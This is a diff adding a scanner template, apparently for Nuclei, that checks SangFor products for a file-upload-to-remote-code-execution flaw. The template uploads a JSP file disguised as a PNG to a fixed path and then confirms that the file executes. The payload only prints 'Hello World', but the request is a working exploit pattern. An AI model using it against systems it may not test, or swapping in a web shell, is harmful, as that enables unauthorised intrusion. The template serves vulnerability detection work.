@@ -1,0 +1,45 @@
+id: sangfor-common-uploadToRce
+
+info:
+  name: SangFor-common-uploadToRce
+  author: iSee857
+  severity: critical
+  description: |
+    SangFor-common-uploadToRce
+  tags: sangfor
+variables:
+  random: '{{rand_text_alpha(5)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /fort/trust/version/common/common.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+        Accept-Language: zh-CN
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+
+        ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+        Content-Disposition: form-data; name="file"; filename="{{random}}.jsp"
+        Content-Type: image/png
+
+        <%
+        out.println("Hello World");
+        %>
+        ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5--
+      - |
+        GET /fort/trust/version/common/{{random}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Hello World"
